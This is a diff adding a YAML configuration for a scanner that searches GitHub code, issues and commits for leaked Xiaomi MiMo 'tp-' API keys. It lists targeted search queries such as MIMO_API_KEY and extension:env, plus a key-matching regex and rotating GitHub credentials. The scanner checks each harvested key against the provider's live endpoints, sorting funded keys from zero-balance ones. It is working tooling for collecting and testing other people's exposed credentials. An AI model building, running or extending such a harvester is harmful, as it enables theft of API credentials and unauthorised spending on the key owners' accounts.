@@ -1,0 +1,171 @@
+# Xiaomi MiMo-only scan configuration
+# Two regional Token Plan endpoints, one task each:
+#   mimo-cn -> https://token-plan-cn.xiaomimimo.com/v1   (mainland China cluster)
+#   mimo-sg -> https://token-plan-sgp.xiaomimimo.com/v1  (Singapore cluster)
+# IMPORTANT: Token Plan endpoints only accept tp- prefixed keys. The pay-as-you-go
+# sk- keys (api.xiaomimimo.com) cannot be validated on these endpoints, so only
+# tp- keys are collected.
+# Upstream: per-endpoint GitHub search conditions (top 1000 results per query).
+# Downstream: each task validates keys against its own endpoint's GET /models,
+# then probes a minimal chat completion to surface 402 (zero-balance keys are
+# filtered to no-quota-keys.txt instead of being marked valid).
+# Results are written to ./data-mimo/providers/<task>/*.txt
+
+global:
+  workspace: "./data-mimo"
+  max_retries_requeued: 3
+  proxy: ""
+  github_credentials:
+    sessions:
+      - "your_github_session_here"
+    tokens:
+      - "your_github_token_here"
+    strategy: "round_robin"
+  user_agents:
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+
+pipeline:
+  threads:
+    search: 1
+    gather: 4
+    check: 2
+    inspect: 1
+  queue_sizes:
+    search: 100000
+    gather: 200000
+    check: 500000
+    inspect: 1000000
+
+monitoring:
+  update_interval: 2.0
+  error_threshold: 0.1
+  queue_threshold: 1000000
+  memory_threshold: 1073741824
+  response_threshold: 5.0
+
+persistence:
+  batch_size: 1
+  save_interval: 5
+  queue_interval: 60
+  snapshot_interval: 300
+  auto_restore: true
+  shutdown_timeout: 30
+  format: txt
+
+ratelimits:
+  github_api:
+    base_rate: 0.15
+    burst_limit: 3
+    adaptive: true
+  mimo-cn:
+    base_rate: 0.2
+    burst_limit: 2
+    adaptive: true
+  mimo-sg:
+    base_rate: 0.2
+    burst_limit: 2
+    adaptive: true
+
+tasks:
+  # ============ Mainland China cluster: token-plan-cn.xiaomimimo.com ============
+  - name: mimo-cn
+    enabled: true
+    provider_type: mimo
+    use_api: true
+    max_pages: 1000
+    search_types: [code, issues, commits]
+    stages:
+      search: true
+      gather: true
+      check: true
+      inspect: true
+    api:
+      base_url: https://token-plan-cn.xiaomimimo.com/v1
+      completion_path: /chat/completions
+      model_path: /models
+      default_model: mimo-v2.5-pro
+      auth_key: Authorization
+      extra_headers: {}
+      api_version: ""
+      timeout: 30
+      retries: 3
+    patterns:
+      key_pattern: "tp-[0-9A-Za-z_-]{20,}"
+      address_pattern: ""
+      endpoint_pattern: ""
+      model_pattern: ""
+    conditions:
+      # Each GitHub API search query has its own 1000-result window.
+      - query: '"MIMO_API_KEY"'
+      - query: '"MIMO_API_KEY="'
+      - query: '"MIMO_API_KEY:"'
+      - query: '"token-plan-cn.xiaomimimo.com"'
+      - query: '"xiaomimimo.com"'
+      - query: '"xiaomimimo.com" "Authorization"'
+      - query: '"xiaomimimo.com" "api_key"'
+      - query: '"mimo" "api_key" "xiaomi"'
+      - query: '"tp-" "xiaomimimo.com"'
+      - query: '"mimo-v2.5"'
+      - query: '"MIMO_API_KEY" language:Python'
+      - query: '"xiaomimimo.com" language:JavaScript'
+      - query: '"xiaomimimo.com" extension:env'
+      - query: '"xiaomimimo.com" extension:json'
+      - query: '"mimo" extension:yaml'
+    rate_limit:
+      base_rate: 0.2
+      burst_limit: 2
+      adaptive: true
+    storage:
+      directory: ""
+      plan: ""
+
+  # ============ Singapore cluster: token-plan-sgp.xiaomimimo.com ============
+  - name: mimo-sg
+    enabled: true
+    provider_type: mimo
+    use_api: true
+    max_pages: 1000
+    search_types: [code, issues, commits]
+    stages:
+      search: true
+      gather: true
+      check: true
+      inspect: true
+    api:
+      base_url: https://token-plan-sgp.xiaomimimo.com/v1
+      completion_path: /chat/completions
+      model_path: /models
+      default_model: mimo-v2.5-pro
+      auth_key: Authorization
+      extra_headers: {}
+      api_version: ""
+      timeout: 30
+      retries: 3
+    patterns:
+      key_pattern: "tp-[0-9A-Za-z_-]{20,}"
+      address_pattern: ""
+      endpoint_pattern: ""
+      model_pattern: ""
+    conditions:
+      # Singapore Token Plan keys + shared MiMo env keys (validated against sgp).
+      - query: '"token-plan-sgp.xiaomimimo.com"'
+      - query: '"MIMO_API_KEY"'
+      - query: '"MIMO_API_KEY="'
+      - query: '"MIMO_API_KEY:"'
+      - query: '"xiaomimimo.com" "Authorization"'
+      - query: '"xiaomimimo.com" "api_key"'
+      - query: '"mimo" "api_key" "xiaomi"'
+      - query: '"tp-" "xiaomimimo.com"'
+      - query: '"mimo-v2.5" "api_key"'
+      - query: '"MIMO_API_KEY" language:Python'
+      - query: '"xiaomimimo.com" language:JavaScript'
+      - query: '"xiaomimimo.com" extension:env'
+      - query: '"xiaomimimo.com" extension:json'
+      - query: '"mimo" extension:yaml'
+    rate_limit:
+      base_rate: 0.2
+      burst_limit: 2
+      adaptive: true
+    storage:
+      directory: ""
+      plan: ""
